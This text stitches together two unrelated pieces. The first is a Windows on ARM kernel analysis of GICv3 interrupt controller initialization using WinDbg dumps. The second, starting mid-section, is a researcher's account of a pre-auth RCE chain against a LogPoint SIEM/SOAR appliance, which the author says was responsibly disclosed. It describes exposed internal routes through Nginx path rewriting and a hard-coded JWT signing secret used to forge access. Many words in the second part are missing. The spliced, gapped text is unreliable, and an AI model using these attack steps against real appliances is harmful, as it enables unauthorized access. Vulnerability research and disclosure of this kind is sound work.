kd> dt nt!_MAPIC -r2 +0x000 Header : _DESCRIPTION_HEADER +0x000 Signature : Uint4B +0x004 Length : Uint4B +0x008 Revision : UChar +0x009 Checksum : UChar +0x00a OEMID : [6] Char +0x010 OEMTableID : [8] Char +0x018 OEMRevision : Uint4B +0x01c CreatorID : [4] Char +0x020 CreatorRev : Uint4B +0x024 LocalAPICAddress : Uint4B +0x028 Flags : Uint4B +0x02c APICTables : [1] Uint4B
```

The `APICTables` member of this structure corresponds to the `Interrupt Controller Structure[n]` outlined in the official ACPI specification - which refers to a list of interrupt controller structures available on the system.

In this case the `nt!_MAPIC` structure acts as a _header_ of sorts to describe all of the various interrupt structures which follow - all of which make up the interrupt functionality on the system. WinDbg provides a nice extension which allows us to easily parse-out what functionality is present:

```

```

We can see many structures are present here: the GIC distributor (of which there can only be), the “Processor Local GIC”, which refers to the per-CPU “interfaces” we mentioned earlier. My machine has 6 CPUs and 12 total cores (and we can see there are 6 here. These are represented by the “GIC CPU Interface (GICC) Structure” structure mentioned in the ACPI specification), per-CPU GIC redistributors (GIC Redistributor (GICR) Structure), and a single MSI (GIC MSI Frame Structure) interface.

`nt!HalpGic3Discover` is then responsible for parsing all of the present interrupt structures and enlightening the kernel about what types of GIC features are supported (are LPIs supported, are Interrupt Translation Services required, how many enabled GIC CPU interfaces are there, and other items). `nt!HalpGic3Discover` receives a single parameter - a value from the `EXT_ENV` enumeration that denotes more information about the current operating environment - and is passed on down the initialization stack. In our case, for instance, the operating environment is that of `ExtEnvHvRoot` \- because I am on a machine which has VBS enabled and, therefore, the Windows OS resides in the root partition. This means that the GIC needs to interact with the root partition. As we will see later, especially in the case of virtual interrupts, knowing the execution environment is important.

```
lkd> dt nt!_EXT_ENV ExtEnvUnknown = 0n0 ExtEnvNativeHal = 0n1 ExtEnvHvRoot = 0n2 ExtEnvHvGuest = 0n3 ExtEnvHypervisor = 0n4 ExtEnvSecureKernel = 0n5
```

As a point of contention, however, dynamic analysis is done in a VM, and so (obviously) the operating environment is that of a guest:

```
0: kd> dx ((nt!_GIC3_DATA*)0xfffff7f440000a10)->ExtEnv ((nt!_GIC3_DATA*)0xfffff7f440000a10)->ExtEnv : ExtEnvHvGuest (3) [Type: _EXT_ENV]
```

On success, the GIC distributor is then _validated_ via `nt!Gic3ValidateIoUnit`. As mentioned the single GIC distributor is where all interrupt sources are wired to. This is a very important structure. On Windows, the `nt!_GIC_DISTRIBUTOR` structure represents the GIC distributor.

The GIC distributor structure defined by Windows is used to _describe_ the GIC distributor. However, the GIC distributor is actually mapped into _physical_ memory and is accessed on Windows by the `ControllerPhysicalAddress` member of the `nt!_GIC_DISTRIBUTOR` structure. This address has a layout of the _actual_ GIC distributor described by ARM here. This structure, which is not in the Windows symbols (I manually added it into IDA) fills out the rest of the “enlightened” data of the kernel - including the number of supported security states, if LPIs are supported ( _supported_ \- not in use), extended SPI support, and a last GIC version check.

After the GIC is validated by the Windows kernel, the actual interrupt controller is _registered_ with Windows. This is done through the `nt!HalpGic3RegisterIoUnit` function. This function is responsible for filling out the information which is used to construct the list of registered interrupt controllers on the system. On the machine this analysis was performed on, there was only one registered interrupt controller. This is achieved by filling out an `nt!_REGISTERED_INTERRUPT_CONTROLLER` structure and adding it to the doubly-linked list of interrupt controllers, managed by the `nt!HalpRegisteredInterruptControllers` symbol, and also incrementing the count of `nt!HalpInterruptControllerCount`. Using WinDbg we can actually parse the entire linked list (which contains only one link) to view the contents of the registered interrupt controller.

Here we can see, and it should be no suprise, that the `KnownType` is set to `InterruptControllerGicV3` \- which seems to indicate that we are looking at the correct structure. This is how Windows goes from interrupt functionality discovery to actually registering an interrupt controller with the OS, from what is available from hardware. The registered interrupt controller also contains a list of functions (represented by the `nt!_INTERRUPT_FUNCTION_TABLE` structure) which a list of functions which allow further configuration of the interrupt controller and/or interaction from the HAL. These are _not_ the “interrupt handler” functions.

After the controller is registered, it has still not been _initialized_ completely. First, the GIC version is preserved ( `nt!HalpInterruptGicVersion`). Next, before each of the interrupt controllers (in our case, just one) is actually fully-initialized, many of the crucial and low-level interrupt handlers, like the CPU’s SGI (e.g., inter-processor interrupt, via `KiIpiServiceRoutine`), the reboot service ( `nt!HalpInterruptRebootService`), etc. are registered via `nt!HalpCreateInterrupt`. `nt!HalpCreateInterrupt` is responsible for allocating an interrupt object ( `nt!_KINTERRUPT`) \- which represents a particular type of interrupt and allows the OS/software to register a particular _interrupt service routine_ ( `KINTERRUPT->ServiceRoutine`). `nt!KeInitializeInterruptEx` is responsible for filling out the majority of the `nt!_KINTERRUPT` object, including passing parameters from `nt!HalpCreateInterrupt` \- such as the `ServiceRoutine`, `Vector` (more on this in a little bit, but there is a maximum value of `0xFFF`), and `Irql` (IRQL the CPU will be when the interrupt occurs).

After the various interrupt objects (we still have not called `nt!HalpInterruptInitializeController`) are created they are then _connected_ to the IDT via `nt!KiConnectInterruptInternal`.

The first thing that `nt!KiConnectInterruptInternal` (on Windows on ARM) does is perform some basic validation. The target interrupt to connect cannot have a vector number greater than 4095 (more on this later), the IRQL associated with the target interrupt cannot be higher than `HIGH_LEVEL`, ensure the `Number` member of the `KINTERRUPT` object is valid (this is _not_ the interrupt number, but is instead the target CPU number for which the interrupt has been initialized for), and ensure that the `SynchronizationIrql` associated with the interrupt object (the IRQL at which the lock stored in the interrupt object itself is acquired) is valid.

After basic validation, the kernel will index the _per-CPU_ IDT via `KPCR->Idt` (via `nt!KiGetIdtEntry`) to locate the target location where the interrupt object we want to connect to the IDT will reside (notice we do _not_ use `KPCR->IdtBase`, which is the related field on x64. This field does not exist on ARM64). This will store the first 16 interrupts which are registered. Anything over the first 16 will be stored in the extended IDT ( `KPCR->IdtExt`).

For example, the SGI/IPI interrupt is registered through a call to `nt!HalpCreateInterrupt` with the following parameters:

```
HalpCreateInterrupt(KiIpiServiceRoutine, 0xE01, 0xE);
```

`0xE01` represents the `KINTERRUPT.Vector` interrupt object value. This can be seen below.

This means that in our case `nt!KiGetIdtEntry` would index the first “regular” IDT ( `KPCR->Idt`), because the lower nibble is less than the maximum value of 16. There is some difference, however, with how a particular IDT entry is accessed between x64 and ARM64 (the CPU does not know about the IDT layout via the IDTR, for example, since a generic interrupt controller is being used). We will talk more on this in the section on interrupt dispatching and handling. In addition, although the variable here is named `VectorIndex` this is not _entirely_ true. This value contains more than just a vector index. This can be seen by how this value is accessed in software:

1. Extracting the upper byte of `KINTERRUPT.Vector`( `0xE0`)
2. Adding the lower nibble to the remaining value.

In our example, `0xE01` becomes `0xE1`. This is the index into the IDT for the target interrupt. This is where, into the IDT, the actual interrupt object is written.

As a side note, the value of the vector seems to be a effectively a masking of the target IRQL for the interrupt and the actual index into the IDT. So `0xE01` has an IRQL of `0xE`, etc. - with one exception, which I am unsure of why at the current moment - and that is the interrupt associated with rebooting. For an unknown reason this interrupt object ( `nt!HalpInterruptRebootService`) has a vector of `0xd07` and an actual IRQL of `0x7`.

It would seem that there can be, in this case, 16 IRQLs (as there is on Windows on ARM) and each of these IRQLs can have 16 associated interrupts - for a total of 256 interrupts. This makes sense, as technically the IDT array in the processor control region ( `nt!_KPCR`) is technically a hardcoded 256-element array!

As an aside, on my current ARM machine, the “lowest” IRQL with a registered interrupt is that of `0x2`, or `DISPATCH_LEVEL`. The service routine for this interrupt is `nt!HalpInterruptSwServiceRoutine` \- which seems to indicate this is the _software_ interrupt service routine (which is a wrapper to the _real_ function, `nt!KiSwInterruptDispatch` \- which is famous for being associated with PatchGuard and is also present in the x64 IDT. It does not seem to be an _actual_ interrupt handler, but more present as a “security-by-obscurity” feature).

Once the initial interrupt objects have been connected to the software-representation of the interrupt controller ( `nt!HalpRegisteredInterruptControllers`) a call to `nt!HalpInterruptInitializeController` occurs - which performs much of the lower-level interrupt initialization logic. This effectively begins by forwarding the in-scope registered interrupt controller to `nt!HalpInterruptInitializeLocalUnit`.

`nt!HalpInterruptInitializeLocalUnit` begins by checking if the `DAIF` system register has `DAIF.I` set - which indicates the status of whether or not IRQ exceptions are masked. This is another way of checking if interrupts will be received by the current exception level. On my current machine, at this stage in the system initialization, both FIQs and IRQs are masked. _If_, for whatever reason, IRQs and FIQs were not masked (effectively “temporarily disabled”) this function would set `DAIFSet` to a mask of `0b11` \- which allows writing to the `DAIF` system register.

After interrupts are temporarily disabled, `nt!HalpInterruptInitializeLocalUnit` will invoke `nt!HalpGic3InitializeLocalUnit`. `nt!HalpGic3InitializeLocalUnit` is one of the registered functions with the registered interrupt controller ( `REGISTERED_INTERRUPT_CONTROLLER.FunctionTable[InitializeLocalUnit]`). `nt!HalpGic3InitializeLocalUnit` accepts an argument to the registered controllers _internal data_ ( `REGISTERED_INTERRUPT_CONTROLLER.InternalData`). The internal data is filled out in `nt!HalpGic3RegisterIoUnit` and, after construction, the internal data is stored in the global variable `nt!HalpGic3`. This internal data is accessible as a `GIC3_DATA` structure - which is in the symbols. The internal data uses an `ANYSIZE_ARRAY` pattern to also store N-number of `GIC3_LOCALUNIT_INFO` structures after the internal internal data itself - with N referring to the amount of CPUs on the current machine.

Some items of interest worth calling out in the `GIC3_DATA` structure, which provide an additional layer of abstraction. Most other data is pretty self-explanatory:

1. `IoUnitBase` = the _physical_ address of the GIC Distributor
2. `IoUnit`\- the mapped _virtual_ address of the GIC Distributor
3. `GsiBase`\- From the ACPI spec - this is the Global System Interrupt (GSI) base value. Effectively the base number of the wired interrupt numbers available. 1:1 mapping to AMR’s INTIDs
4. `Identifier`\- the GIC Distributor’s hardware ID

`nt!Halp3Gic3InitializeLocalUnit` begins by locating the target CPU’s _local unit info_ \- represented by the `_GIC3_LOCALUNIT_INFO` structure, as previously mentioned. If the local CPU interface has not been initialized, it is then configured. The local unit is the representation of the local CPU’s interrupt schema - including redistributor and CPU interface information. The ACPI’s interrupt table is parsed for the redistributor and CPU interface structures. From these structure the physical address of the redistributor is mapped into virtual memory, various trigger modes are extracted (performance and maintenance interrupts are denoted as either level-sensitive or edge-sensitive. Edge-sensitive means an interrupt is only “received” when there is an actual _change_ in the physical interrupt line (e.g., 0 -> 1, such as voltage goes down from up or up from down). Level-sensitive means that an interrupt is received/reported when the interrupt line is asserted (the line is “set to 1” if we are over-simplifying) _regardless_ of if this was a change from the previous state). Additionally, the `MPIDR_EL1` system register, the Multiprocessor Affinity Register, is preserved - which is the register that contains identifying information about a target processor (effectively a unique processor identifier, with much more granular information like cluster ID in a cluster of processors - which are a grouping of processors used to share resources/etc.). In this case all of the “non-identifier” bits (bits in the register that denote metadata, usch as indication of a uniprocessor system) are cleared and the _affinity_ bits are used to identify the CPU (affinity level 0, 1, 2, 3)

Finally, the redistributor is mapped into virtual memory (with the size of the mapping being represented by `HalpGic3RedistMapSize`, which is computed in `nt!HalpGic3RegisterIoUnit`). This marks the local unit as initialized ( `GIC3_LOCALUNIT_INFO->Initialized = 1`).

Next, the appropriate _Interrupt Controller System Register Enable_, or `ICC_SRE_ELX` register is read. It is worth calling out some nuance here. `ICC_XXX` actually _replaces_ `GICC_XXX` in our case. `GICC_XXX` refers to _legacy_ registers. In GICv3, according to the documentation, the physical CPU interface registers are prefixed with `ICC` and the virtual CPU interface registers are prefixed with `ICV` _instead_ of `GICV`. This is why in Windows, for example, you will only see writes to the `ICC_XXX` system registers.

The kernel will always set bit `1`, if it is not already set. This is the `ICC_SRE_ELX.SRE` bit - which denotes if the memory-mapped interface or system register interface should be used to interface with the GIC CPU interface for the target CPU. By setting the value to `1`, this indicates that the system register interface will be used (as the GIC documentation also states that system registers must be used when affinity routing is in-use for all enabled security states. It is worth calling out some items, like the GIC distributor, are _always_ memory-mapped).

The kernel then disables group 1 interrupts for the time being (there are only 2 groups, group 0 is for interrupts handled EL3, so group 1 is for all other interrupts in the current exception and security level. Remember that Windows does not use the traditional security levels, as it already uses VTLs to separate “secure and non-secure worlds”), sets the interrupt priority filter to `0` (meaning the CPU will accept interrupts with a priority higher than `0`. `0` is the highest value, so this effectively means only the interrupts higher than a priority of `0` can be let through. Given that `0` is the highest priority, as the lower the number the higher the priority, this also helps to disable interrupts until the local unit is configured), and also sets the interrupt controller binary point register for EL1 to a value of `3` \- which is the minimum value needed.

At this point it is probably worth briefly mentioning interrupt grouping. Interrupt grouping allows the GIC to group interrupts based on a set of characteristics - specifically aligned to the ARM security and exception model. Interrupt grouping groups interrupts by security state (non-secure and secure worlds) and exception level. It is also worth calling out that Windows only uses group 1 interrupts and specifically _only_ in the non-secure state. This can be confirmed by reading the `GICD_CTLR.EnableGrpXXX` values from the GIC distributor - which describes what groups of interrupts are enabled. This can also be further confirmed by parsing `ntoskrnl.exe` and `hvaa64.exe` (Hyper-V) for a lack of writes to the system regiseters `ICC_IAR0_EL1`, `ICC_EOIR0_EL`, etc. where `0` refers to group 0 - which are the interrupts associated with interrupts being handled at EL3, which is the “bridge” between non-secure and secure worlds.

1. `GICD_CTLR.EnableGrp0` = 0
2. `GICD_CTLR.EnableGrp1NS` = 1 (Non-Secure)
3. `GICD_CTLR.EnableGrp1S` = 0 (Secure)

Moving on, `nt!HalpGic3InitializeLocalUnit` then proceeds to fill out some additional GIC redistributor information in the `GIC3_LOCALUNIT_INFO` structure. First, information of interest from the LPI configuration table, which is tracked by the in-scope CPU’s GIC redstributor, is added to the “internal data” we have been examining so far (tracked via `nt!HalpGic3`). This is achieved by accessing the `GICR_PROPBASER` register from the GIC redistributor - which specifies the LPI configuration table.

The `LpiConfig` member of the `GIC3_DATA` structure, of type `LPI_CONFIG_TABLE_ENTRY`, maintains the _virtual_ address of target CPU’s LPI table (and all other LPI configuration tables). Note that the redistributor’s format is documented by ARM, and is _not_ part of the Windows symbols.

Next the LPI _pending_ table is mapped into virtual memory and this time is tracked this time through the local unit’s structure ( `GIC3_LOCALUNIT_INFO`) as the `PendingTable` member. This is achieved by accessing the `GICR_PENDBASER` register from the GIC redistributor’s memory-mapped interface. In addition, the global GIC data structure ( `nt!HalpGic3`) that represents, in virtual memory, the state of the GIC updates the per-CPU _crash dump_ information. The pending LPI table is also added to the crash dump information.

One thing to call out - it should be noted that starting at an offset of `0x10000` (64KB) _after_ the GIC redistributor registers (which contains `GICR_CTLR`, etc.) comes the GIC redistributor registers responsible for configuring SGIs and PPIs. They are also documented by ARM. This is also called out in the GIC documentation:

> Each Redistributor defines two 64KB frames in the physical address map:
>
> RD\_base for controlling the overall behavior of the Redistributor, for controlling LPIs, and for generating LPIs in a system that does not include at least one ITS.
> SGI\_base for controlling and generating PPIs and SGIs.

This means that from `GIC3_LOCALUNIT_INFO->Redistributor + 0x1000` contains the start of the SGI/PPI redistributor registers. From the SGI/PPI registers the `GICR_ICENABLER0` register, or the _Interrupt Clear-Enable Register 0_ register, is configured. This register is configured to enable the forwarding of all interrupts to the GIC redistributor by setting the _enable_ bit (indicated by writing a value of `1`) to the target register - while also being sensitive to any SGIs ( `GICR_ICENABLER0` encapsulates both SGIs and PPIs) which are reserved for the ARM Firmware Framework A-Architecture (FF-A). Specifically, the `FFA_FEATURE` call is made to retrieve the interrupt ID (INTID) for the _Schedule Receiver interrupt_ (SRI) and ensures that this interrupt ID is always _disabled_. However, this is only applicable in some operating environments (like without the presence of Hyper-V) and, therefore, my machine shows that `nt!HalpFfaEarlyErrorRecords`, an array of errors associated with initializing FF-A, reports an error of `STATUS_NOT_SUPPORTED`, which is _translated_ from the `FFA_ERROR` code of `NOT_SUPPORTED` (and, thus, no need to worry about “special” handling of SGIs associated with the FF-A). This means that there is no SGI reserved for the FF-A’s SRI. This is just something I felt the need to call out. This can be also further validated by checking the presence of `nt!HalFfaSupported` and `nt!HalFfaInitialized` \- which denote FFA support and state.

Finally, one of the last `nt!HalpGic3InitializeLocalUnit` does is configure the `ICC_CTLR_EL1` system register, which is the _Interrupt Control Register_. If the operating environment is `ExtEnvHypervisor` then `ICC_CTLR_EL1.EOIMode` (End-of-interrupt) is set. Otherwise (as is in our case, since our operating environment is `ExtEnvHvRoot`) `EOIMode` is set to `0`. End of interrupt (EOI) refers to a specific action that is taken to indicate that the software routine which handled a target interrupt has completed. A value of `0` in the register indicates that a write to, for example, `ICC_EOIR1_EL1` (which is for group 1 interrupts) is _both_ responsible for “priority drop” and deactivation of an interrupt. Whereas a value of `1` indicates a write to a _separate_ register is needed for deactivation. The \[ARM\] documentation on configuring the GIC states that this mode ( `EOIMode == 1`) is used for virtualization purposes.

`nt!HalpGic3InitializeLocalUnitData` ends by re-enabling interrupts, now that the local CPU unit (redistributor and CPU interface) is configured, via `ICC_IGRPEN1_EL1` (and later `nt!HalpInterruptMarkProcessorStarted` marks the processor as “started” for interrupts)

After `nt!HalpGic3InitializeLocalUnit` data exits, a _per-CPU_ (technically per-core, and my system has 12 cores) structure, `INTERRUPT_TARGET`, is filled out and managed by the symbol `nt!HalpInterruptTargets`. This is achieved via `nt!HalpGic3ConvertId`. These structures outline additional information about the CPU schema, such as if the CPU resides in a cluster, along with CPU ID information. The CPU ID information is effectively the previously mentioned affinity values from the `MPIDR_EL1` system register.

After configuring the interrupt targets (representing the targets for which interrupts can arrive) the _real_ per-CPU interrupt priority is set with a call to `nt!HalpGic3SetPriority` (we saw earlier it was temporarily set to `0`). After the local unit is stood up, the priority is updated per-CPU to `0xF0`. `0xF0` is `0b11110000` in binary (and bits `0:7` in `ICC_PMR_EL1`, the priority register, make up the priority level). When setting a value of `0xF0` this indicates that the _total_ number of priority levels is `16`. This means priority levels `0 - 15` will be handled by each CPU interface.

Once the priority level has been configured (for each CPU), execution is transferred to the function `nt!HalpGic3InitializeIoUnit` \- which accepts a parameter to the `GIC3_DATA` we have been referencing - is called. Specifically the `GIC3_DATA->IoUnit` is configured - which is GIC distributor structure’s _virtual_ address. This means this function is _not_ called per-CPU and instead is called to perform further configuration of the singular GIC distributor. When I say “GIC distributor structure” I am referring to the ARM-documented “one” with all of the memory-mapped registers like the `GICD_CTLR`, `GICD_TYPER`, etc. This is where more configuration of these registers occurs.

`GIC3_DATA->InputLineCount` is first configured. This is done by extracting `GICR_TYPER->ITLinesNumber`. According to ARM documentation, the `ITLinesNumber` is the “number of SPIs divided by 32”. So, `InputLineCount` is simply `GICR_TYPER->ITLinesNumber` \\* 32\. This refers, effectively, to the maximum SPI INTID. This calculation also has to do with the number of interrupt lines (lines = interrupt IDs in our case) that are even available - although some interrupt sources may share a line.

We already previously talked about _extended SPI_ support. This is indicated by `GICD_TYPER->ESPI`. The machine this analysis was conducted on has extended SPI support. When extended SPI support is enabled, bits `31:27` in the `GICD_TYPER` are no longer “reserved” - but refer to `ESPI_range`. This is extracted and stored in `ExtendedInputLineCount` to indicate the maximum supported extended SPI INTID.

From here Windows then _unconditionally_ clears `GICD_CTLR.EnableGrp1NS` \- which is represented by bit `1` (from index of `0`). This means this _disables_ interrupts in the non-secure group 1 group. This is a _temporary_ measure while the rest of the GIC distributor is configured. Next, if the GIC distributor (which, again, is _memory-mapped_ in physical memory and has not been yet fully-configured by the operating system) has `GICD_CTLR.ARE_S` configured - which enables affinity routing in the _secure_ state - _or_ if `ARE_S` is _not_ set (which in this case `ARE_S` is set to `1` \- meaning either way `ARE_S` is going to be set to `1`) the interrupt lines which are supported go under further configuration.

As part of a habit I’ve built over the years —and honestly, part of our 3rd party due diligence— I gave myself 24 hours to do what I always do with any technology we’re about to trust: try to break it.Those 24 hours were enough to uncover three serious vulnerabilities almost immediately. Given their impact, I stopped there and proceeded directly to responsible disclosure.Months later, with time finally on my side, I came back not to look for more bugs but to better understand the system. That second look revealed something far more interesting: how small, seemingly independent  could coalesce into a much larger problem. This article tells that story. It follows a  human’s as it navigates unfamiliar code, undocumented behavior, and assumptions never meant to be tested. Along the way, it includes wrong turns and dead ends, but also the moments where something subtle feels off and careful inspection turns that feeling into a concrete finding.I hope you’ll enjoy the journey as much as I did. Happy New Year to everyone 🎊🥳 This write-up walks through the exact process of building a pre-auth RCE exploit chain by chaining . I start by mapping the appliance’s request flow (two Nginx layers and a split between host Python services and Docker-based Java microservices). From there, the chain forms step by step: exposed internal routes lead to auth primitives, a hard-coded signing secret enables forged access, leaked internal API credentials unlock higher privilege inside the microservice world, an SSRF pivot reaches host-only Python endpoints to mint an admin session, and finally, a rule-engine  sink becomes reachable by bypassing validation via a static AES encryption key in imported alert-rule packages. Each section shows the evidence, the reasoning, and how one weakness becomes the leverage for the next, until the final trigger executes code on the appliance.1. Accessing the main software code-baseThis was the part I expected to be boring. The research started the usual way, with an  image and a fresh VM in my local lab. Since the product was built on top of Ubuntu without additional hardening at the OS level, the standard  was enough to regain root access and enable SSH, leaving me with a stable environment ready for analysis.With access in place, I moved on to the code. The main web application was written in Python, built on a customized Flask framework, and lived under:This wasn’t a fully transparent codebase, though. Like many production appliances, a large portion of the Python logic was shipped only as compiled  files. To work comfortably, I copied the relevant directories to my local and reconstructed the missing sources by decompiling the orphaned bytecode with .This is all fairly standard reverse-engineering work, so I’ll spare you the details.I thought this would be all I needed to quickly dive into manual source code analysis. But it became clear that was far more complex than I had initially assumed. What I thought was a quick surface-level review turned into something much deeper, and I realized I had only scratched the surface.2. Where legacy meets containers! Understanding the Technical Architecture OverviewAfter spending a few hours with both the operating system and the codebase, the product’s history began to reveal itself. Some design choices initially felt odd, but began to make sense once I understood the product’s pivot over time.LogPoint was clearly designed as a  platform. The architecture reflects that era: core services like the Python backend, log normalizers, and database components run directly on the host operating system, a design long before Docker and modern container orchestration became the norm.As the market shifted toward automated response,  needed to evolve. That evolution took the form of , a new capability that couldn’t easily fit within the original architecture. Instead of rewriting everything, the newer SOAR components were introduced using Docker. The moment SOAR is enabled, containerized services spin up alongside the legacy host-based ones, marking a clear boundary between the product’s past and its present.->  is about visibility—collecting and correlating security events to tell you .->  is about action—automating response so something actually happens next.If SIEM is the system that raises the alarm, SOAR is the one that pulls the lever.The diagram below reflects my high-level understanding of the technical architecture. The SOAR components run as Docker containers, configured with a bridged network interface, sitting alongside long-standing host-level services.It’s almost impossible to migrate the existing services and core software to the Docker instance without a significant engineering investment. So they relaxed Docker network hardening and allowed all processes to communicate with each other.One more detail is worth calling out. All of these SOAR microservices are implemented in and run inside the container network. This means the evolution was not just architectural but also technological, with a clear shift from the original  stack to . That change alone raises several questions about consistency, assumptions, and trust boundaries, which I will come back to later.2.1 Tracing External Attack VectorsThe end goal is simple: pre-authenticated remote code execution. Over two decades of working with and breaking security products, I have learned that understanding the design is often the most effective way to build reliable attack vectors. Once the architecture is clear, the deeper you go down the rabbit hole, the fewer surprises you encounter and the easier it becomes to reason about where things might fail.The following diagram is what I’ve understood during the research. Due to the default  Rules: We can only access , which are enabled by default.This means there are two  instances to focus on. To determine what is reachable from the outside (ATTACKER HTTP Request in the diagram), I go straight to their configurations.The first Nginx instance sits at the edge of the appliance and handles all incoming requests on port 443. The second runs inside the containerized environment and routes traffic to the SOAR microservices. Any external request must pass through the outer Nginx before reaching the container layer, making the boundary between the two especially interesting from a security perspective.2.2 A Tale of Two Nginx InstancesLet’s have a look at the . You can find the configuration file at /opt/makalu/installed/webserver/deploy/nginx.confAt a glance, it acts primarily as a reverse proxy, forwarding selected URL paths to an internal service listening on . Most SOAR related endpoints, along with static assets and runtime resources, are passed through with minimal transformation.Simply listing the Docker and accessing the  instance helps me to verify that the requests are sent to the second Nginx, which listens et’s have a look at the second NGINX conf. Due to the length of the conf file, I just grepped the most important lines. That will give you the general idea of what’s going on.Unlike the outer proxy, this one acts as a traffic dispatcher between multiple SOAR microservices. Each path is mapped directly to a specific backend , , , , or even  itself.What stands out here is how permissive the Nginx path configuration is. Broad routing rules make it trivial to reach internal services via URL paths alone. At this point, Nginx is no longer enforcing a security boundary; it simply routes traffic, and a matching path is often all it takes for a request to be trusted and forwarded.Bug 1 – Nginx Path Routing MisconfigurationTypically, this design is risky but not dangerous. It assumes that every single endpoint behind it enforces authentication and authorization correctly. This approach often works well when a central session mechanism is a . The user presents the token; the proxy forwards it, and each service validates identity and permissions independently. ( API Gateway is a much better way to do this btw )But this is where the attacker mindset kicks in. A routing layer like this dramatically expands the attack surface. I am no longer looking at a single application. I am looking at a collection of internal services, each with its own endpoints, assumptions, and edge cases. And all I need is one mistake in one place to start pulling on the thread. That realization brings me back to a question I have been circling since the beginning of this research. How do a legacy Python backend and a set of modern Java microservices actually work together!?How the authentication on the Python-backend side is shared/validated on the SOAR world (docker services) ?The most essential task is to answer these questions. So I started running straightforward tests. First, I know these containers can communicate with each other over HTTP. It’s internal communication anyway. And I also know that Docker is in bridge mode, which gives me a quite easy way to gain more visibility between the Docker-to-Docker communicationsA simple  running on the host’s local interface is enough to show every internal HTTP request as it happens. Almost immediately, the terminal begins to flood with traffic.I logged into the product with the administrator users, I  go to the Settings > SOAR settings https://192.168.179.136/soar/settings#/. I looked at my Burp Suite logs and saw tons of requests. When I glanced back at the terminal running tcpdump, all hell broke loose. The volume of internal traffic is far higher than the UI interaction alone would suggest.I started reading my Burp Suite logs, and I’ve cherry-picked the https://192.168.179.136/soar/api/v1/session/username request. After resetting my terminal and clearing all output, I sent the request to the Repeater using  and triggered it once by clicking the  button.When you repeat that request, you can see instantly 2 different HTTP requests appear in  output.These two requests answer my question. The first request, GET /api/v1/session/username, is the one I trigger directly. The second request, POST /sso/v1/logpoint/validate-cookie, is generated behind the scenes by the microservices themselves! Let me explain what happened.1 – From the outside world, I sent a request to the /soar/api/v1/session/username. Due to the following  rules, it’s sent to the https://localhost:9443/api/2 – Following the  rule, it kicked in and forwarded it to the  container3 – Api Services take the session cookie from the request and send a brand new HTTP POST call to the POST /sso/v1/logpoint/validate-cookie endpoint with a body to validate the session!4 – This endpoint is also from the  container. Somehow, this function validates our session. But, seriously… how does it do it? But before following the white rabbit and decompiling Java microservices, I pause and focus on the bug itself. The /sso/v1/logpoint/validate-cookie endpoint stands out immediately. This endpoint is clearly not meant to be publicly accessible. And yet, from an attacker’s point of view, I can reach it directly just by adding the  prefix to the path.That moment is hard to ignore. No authentication trickery, no bypass logic yet. Just a simple path rewrite, quietly turning an internal endpoint into something exposed to the outside world.One Cookie, Many Hops: Mapping the SOAR Authentication PipelineNow it is time to follow the rabbit all the way down. To understand what is really happening, I need to look inside the microservices themselves. Are there other endpoints hiding in plain sight? How does cookie validation actually work behind the scenes?I copied all the JAR files from each and every single one of the Docker images and extracted them intoone folder to keep tracking the execution flow. ( Simple tricks combination of commands: docker ps, grep, docker cp, procyon-decompiler )Login-service: com/secbi/login/generated/api/logpoint/LogpointApi.java Has the following code section that corresponds to the API endpoint we’ve seen on the 2nd request.The above code calls  within the try-catch section, which means we need to keep jumping into these method definitions and understand the execution flow. On line 9 have  from logpointAuthorizationManager. Keep tracking the calls. That’s where we have two important function calls:Line 18: takes the cookie value itselfLine 7:takes the cookie object itselfIf you remember the HTTP response from the Burp Suite screenshot a few sections ago, the same error code appears here: VALID_COOKIE_WITH_LOCAL_SESSION, now sitting right in the source code on line 28. That immediately narrows the focus. Before anything else, I need to understand what happens at line 18:  call. This function does exactly what its name suggests. It queries MongoDB and validates the session. Nothing more. No strange logic, no suspicious shortcuts, nothing that feels exploitable at first glance.But then line 7 comes back into focus.  does not validate a token or a string. It takes the cookie object itself. And while the Java implementation so far looks solid, experience has taught me one thing. Even when everything looks correct, that is exactly when you keep reading. You never really know what you are going to find.That’s a bit interesting. The naming of the methods started to look more promising. Now we’re going to have a look at The  function turns out to be deceptively simple. It checks isCookieValidationUseNewApi(), which does nothing more than return a value through basic setters and getters. Finally, the  comes into view. That is the missing link. The cookie I place in the request flows through all of these functions and is eventually handed to the RestClient for validation against yet another endpoint. In theory, that endpoint belongs to the legacy Python backend running on the host,Bear with me, we are almost there. One last stop before concluding this rabbit hole visit is Finally, the  comes into view. The cookie I include in the request flows through all these functions and is eventually handed to the RestClient for validation against another endpoint. In theory, that endpoint belongs to the legacy Python backend running on the host!Lets just recap what is the call trace we’ve been following.To prove that we can hit all the way there. I’ve changed our cookie value to something that doensn’t exist. Therefore, we will be able to avoid internal caching of this service and reach all the way to the Expected return error, but the shocking moment for me was actually on my terminal. I look for the  container logs and seen this message.I remember this endpoint from the Python backend code analysis. At the time, its purpose was unclear. Now it finally makes sense. Everything I have learned along this path connects here, and it will matter later.The original question is answered, but it leaves me with even more questions than I started with. And that is usually a good sign.One Answer Raises Multiple QuestionsWe now understand how the  endpoint at /soar/api/v1/session/username works internally. But instead of closing the loop, it raises even more questions:Why does an API exist just to return a username?What about the other Docker services like , , or ?Does every request to these services trigger another internal call to , and then again to 127.0.0.1:18000/User/preference ?Where does authorization actually happen in a SOAR platform of this size ?Why not use a shared JWT model between the  microservices instead of chaining internal HTTP requests?At this point, the design starts to feel less like an optimization and more like an assumption worth challenging.Bug 2: Hard-coded JWT SECRET and Authentication Bypass On ALL SOAR APIsWith a clearer understanding of how session validation works between the Java services and the legacy Python backend, one question keeps nagging at me. User-initiated requests might follow this chain of HTTP calls, but how are service-to-service requests authenticated? Workflows, schedulers, cronjobs all run without a user behind them. There has to be something in place.At this point, the familiar 4 a.m. feeling kicks in. Too many questions, not enough answers. I step away, get some sleep, and come back a few hours later with a clearer head. This time, I remind myself why I enjoy this kind of work. Reading someone else’s code, understanding their decisions, and following the paths they laid out is half the fun. So I stop piling on questions and do the simplest thing instead. I go back to the code and keep reading. Within a few minutes, I literally stumbled upon the following controller method. There is nothing we can exploit here, but what the heck is the RequestHeader annotation of , which is not even required by default ??A few minutes later, things finally click. The answer is already there in the code. Internally, the microservices support an API key mechanism per user. It is not enabled by default, at least not yet, but the plumbing clearly exists.Digging a bit deeper leads me straight to the file I am looking forJWTLoginAuthorizationManager.java This is where this research stopped feeling academic! I actually started to feel like I might actually have something to abuse! This class handles  validation using a  and is responsible not only for verifying the token but also for returning the associated permissions. The service-to-service authentication story suddenly makes a lot more sense.The class validates  JWTs derive the user identity and role from the 